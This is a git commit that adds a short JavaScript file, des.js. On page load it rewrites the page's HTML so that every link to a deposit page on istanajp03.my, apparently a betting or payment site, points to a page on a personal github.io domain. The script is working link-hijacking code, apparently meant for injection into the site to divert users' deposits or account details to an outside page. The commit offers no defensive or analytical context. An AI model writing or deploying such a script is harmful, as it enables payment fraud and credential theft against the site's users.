b906c32f0962abe1e84cd6e1f1c40e02158b6e30
inggarfi <inggarsaput@gmail.com>
2025-10-12 18:06:17 +0700

    Create des.js

---
+++ des.js
@@ -0,0 +1,10 @@
+document.addEventListener("DOMContentLoaded", function () {
+  const oldHTML = document.documentElement.innerHTML;
+
+  const newHTML = oldHTML.replace(
+    /https:\/\/istanajp03\.my\/m\/account\/deposit/g,
+    "https://inggarfi.github.io/depoyukbos/kzka"
+  );
+
+  document.documentElement.innerHTML = newHTML;
+});
